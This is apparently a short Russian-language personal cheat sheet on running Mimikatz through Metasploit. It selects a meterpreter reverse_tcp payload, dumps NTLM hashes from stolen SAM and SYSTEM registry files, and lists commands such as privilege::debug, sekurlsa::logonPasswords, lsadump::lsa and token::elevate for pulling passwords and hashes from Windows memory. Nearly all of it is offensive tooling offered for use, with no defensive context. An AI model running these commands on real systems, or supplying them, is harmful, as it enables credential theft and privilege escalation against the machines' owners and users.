# mimi

МИМИКАТЗ в метасплойт

use windows/x64/meterpreter_reverse_tcp

![Uploading image.png…]()


kiwi_cmd lsadump::sam

https://github.com/gentilkiwi/mimikatz/releases 
Как извлечь хеш пароля пользователя NTLM из файлов реестра


Если есть готвый стянуты файл sam  и system
.\mimikatz.exe
lsadump::sam /system:C:\Share-Server\files\SYSTEM /sam:C:\Share-Server\files\SAM

Если из памяти...
После запуска Mimikatz можно использовать следующие команды для вытягивания паролей из памяти Windows:

- `privilege::debug` - открывает привилегии отладки для текущего процесса.
- `sekurlsa::logonPasswords` - выводит введенные пользователем логины и хэши паролей.
- `lsadump::sam` - вытягивает пароли из базы данных SAM.
- `lsadump::lsa` - вытягивает хэши паролей из дискового хранилища LSA.
- `token::elevate` - поднимает привилегии на максимальный уровень.
- `token::whoami` - выводит информацию о текущем пользователе.



